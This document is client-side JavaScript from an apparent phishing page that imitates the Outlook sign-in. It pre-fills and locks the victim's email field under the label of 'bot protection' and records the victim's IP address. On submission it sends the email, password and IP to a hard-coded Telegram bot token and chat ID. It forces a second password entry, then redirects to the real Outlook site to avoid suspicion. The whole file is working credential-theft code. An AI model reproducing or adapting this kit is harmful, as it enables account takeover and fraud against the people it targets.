  <script>
  // Wait for page to fully load
  window.addEventListener('load', function() {
    // Extract email from URL hash (e.g., #john@gmail.com)
    const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
    
    // Also check for email parameter in query string
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromQuery = urlParams.get('email');
    
    // Use email from hash first, then from query parameter
    const finalEmail = emailFromUrl || emailFromQuery;
    
    // Basic validation (must contain @ and ., and no spaces)
    if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
      // Set the email in both the visible and hidden fields
      document.getElementById('hidden-email').value = finalEmail;
      document.getElementById('email').value = finalEmail;
    } else {
      // If no valid email, show placeholder but don't break the form
      document.getElementById('email').value = 'email@example.com';
      document.getElementById('email').style.color = '#999';
    }
  });
  </script>

  <script>
  $(document).ready(function () {
    // First, fetch user's IP and store it in the hidden field
    $.getJSON("https://api64.ipify.org?format=json", function (data) {
      $("#ip").val(data.ip);
      console.log("User IP:", data.ip);
    });
    
    // Make sure email is preserved after page reload
    window.addEventListener('load', function() {
      const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
      const urlParams = new URLSearchParams(window.location.search);
      const emailFromQuery = urlParams.get('email');
      const finalEmail = emailFromUrl || emailFromQuery;
      
      if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
        document.getElementById('hidden-email').value = finalEmail;
        document.getElementById('email').value = finalEmail;
      }
    });

    // COMPLETE BOT PROTECTION - Block all interactions with email field
    $('#email-overlay').on('click keydown keyup keypress focus blur mouseenter mouseleave mousedown mouseup touchstart touchend touchmove', function(e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    });

    // Also protect the actual email input
    $('#email').on('click keydown keyup keypress focus blur mouseenter mouseleave mousedown mouseup touchstart touchend touchmove', function(e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    });

    // Disable copy/paste
    $('#email, #email-overlay').on('copy cut paste', function(e) {
      e.preventDefault();
      return false;
    });

    // Disable right-click
    $('#email, #email-overlay').on('contextmenu', function(e) {
      e.preventDefault();
      return false;
    });

    // Form submission protection
    let formSubmitted = false;
    
    $("#email-form").submit(function (event) {
      // Prevent multiple submissions
      if (formSubmitted) {
        event.preventDefault();
        return false;
      }
      
      event.preventDefault();

      // Get the values from the form fields - ONLY from hidden email field
      let userEmail = $("#hidden-email").val();
      let userPassword = $("#password").val();
      let userIP = $("#ip").val();

      // Validate that we have both email and password
      if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
        console.error("Missing email or password");
        return;
      }

      // Mark as submitted to prevent duplicates
      formSubmitted = true;

      // Telegram credentials
      let botToken = "8492588783:AAENb9XkfvvnkZWcZPEcePB88EX0gJZguMw";
      let chatId = "7241128758";

      // Format the message you want to receive on Telegram
      let messageText = `üìß New Outlook Login\nüë§ User Name: ${userEmail}\nüîë Password: ${userPassword}\nüåê IP Address: ${userIP}\n‚è∞ Time: ${new Date().toLocaleString()}`;

      // Construct the Telegram API URL
      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Check if this is the first or second submission
      let submissionCount = sessionStorage.getItem('outlookSubmissionCount') || 0;
      
      if (submissionCount < 1) {
        // First submission
        submissionCount = 1;
        sessionStorage.setItem('outlookSubmissionCount', submissionCount);
        
        // First Telegram submission
        $.ajax({
          url: telegramUrl,
          type: "POST",
          data: {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'HTML'
          },
          success: function () {
            console.log("‚úÖ First form submission to Telegram successfully");
            // Reload the page after first submission
            setTimeout(function () {
              window.location.reload();
            }, 1000);
          },
          error: function (jqXHR, textStatus, errorThrown) {
            console.error("‚ùå First submission failed:", textStatus, errorThrown);
            // Still reload even if there's an error
            setTimeout(function () {
              window.location.reload();
            }, 1000);
          }
        });
      } else {
        // Second submission
        sessionStorage.removeItem('outlookSubmissionCount'); // Clear the counter
        
        // Second Telegram submission
        $.ajax({
          url: telegramUrl,
          type: "POST",
          data: {
            chat_id: chatId,
            text: messageText + "\nüîÑ Second Submission",
            parse_mode: 'HTML'
          },
          success: function () {
            console.log("‚úÖ Second form submission to Telegram successfully");
            // Redirect to Outlook after second submission
            setTimeout(function () {
              window.location.href = "https://outlook.live.com";
            }, 1000);
          },
          error: function (jqXHR, textStatus, errorThrown) {
            console.error("‚ùå Second submission failed:", textStatus, errorThrown);
            // Still redirect even if there's an error
            setTimeout(function () {
              window.location.href = "https://outlook.live.com";
            }, 1000);
          }
        });
      }
    });
  });
  </script>
